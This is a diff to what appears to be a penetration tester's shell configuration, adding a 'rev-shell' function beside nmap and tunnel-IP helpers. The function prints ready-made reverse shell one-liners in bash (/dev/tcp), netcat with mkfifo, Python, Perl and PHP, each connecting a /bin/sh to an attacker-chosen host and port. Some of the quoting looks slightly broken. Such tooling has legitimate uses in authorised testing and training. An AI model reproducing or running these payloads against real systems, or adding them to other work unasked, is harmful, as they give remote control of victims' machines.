@@ -288,6 +288,30 @@ alias https-server='python3 -m http.server --cert-file=cert.pem --key-file=key.p
 # Scan top 1000 TCP ports with service and version detection
 alias nmap-top-ports='nmap -sV -sC --top-ports=1000'
 
+# -- Reverse Shells --
+# Generate reverse shell one-liners
+rev-shell() {
+    echo "Usage: rev-shell <type> <lhost> <lport>"
+    echo "Types: bash, nc, python, perl, php"
+    case "$1" in
+        bash)
+            echo "bash -i >& /dev/tcp/$2/$3 0>&1"
+            ;;
+        nc)
+            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $3 >/tmp/f"
+            ;;
+        python)
+            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((("$2",$3)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+            ;;
+        perl)
+            echo "perl -e 'use Socket;$i=\"$2\";$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\\&S\");open(STDOUT,\">\\&S\");open(STDERR,\">\\&S\");exec(\"/bin/sh -i\");};'"
+            ;;
+        php)
+            echo "php -r '$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <\\&3 >\\&3 2\\&3\");'"
+            ;;
+    esac
+}
+
 # -- Red Team Functions --
 # Show tun0 IP in prompt
 get_tun0_ip() {
